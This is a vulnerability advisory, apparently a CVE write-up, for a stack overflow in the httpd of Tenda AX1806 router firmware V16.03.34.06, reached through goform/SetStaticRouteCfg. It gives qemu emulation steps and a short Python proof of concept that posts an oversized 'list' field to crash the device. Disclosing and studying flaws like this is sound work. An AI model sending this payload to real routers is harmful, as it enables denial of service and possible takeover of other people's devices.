### Overview

*   设备官网：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   固件下载网站：[https://www.tenda.com.cn/material/show/103518](https://www.tenda.com.cn/material/show/103518)

### Affected version

**V16.03.34.06**

### Environmental simulation

need build Network bridge:

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.142.100/24
brctl addif br0 ens33//搭建网桥
```

qemu start command：

```text-plain
sudo qemu-mipsel-static -L . ./bin/httpd
```

### Vulnerability details

tdhttpd in directory /bin has stack overflow vulnerability. The vulnerability occurrs in the function, which can be accessed via the URL .`fromSetRouteStatic goform/SetStaticRouteCfg`

![image](https://github.com/Raining-101/IOT_cve/blob/a7697c82331c99189be61d7b19f54cddc00365d5/image/1_tenda-ac8_image.png)

Stack overflow point：

![image](https://github.com/Raining-101/IOT_cve/blob/326b7c464ac9bdadf22b3eb19b48fd54df416bde/image/2_tenda-ac8_image.png)
As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution with carefully crafted overflow data.

### PoC

```text-plain
import requests

data = {
    b"list": b'Raining'*0x400+b',R,R,R'
}
res = requests.post("http://192.168.142.100/goform/SetStaticRouteCfg", data=data)
print(res.content)
```

![image](https://github.com/Raining-101/IOT_cve/blob/d5ce501b4af297283a55dae755559140994e1524/image/Snipaste_2025-02-21_15-17-25.png)


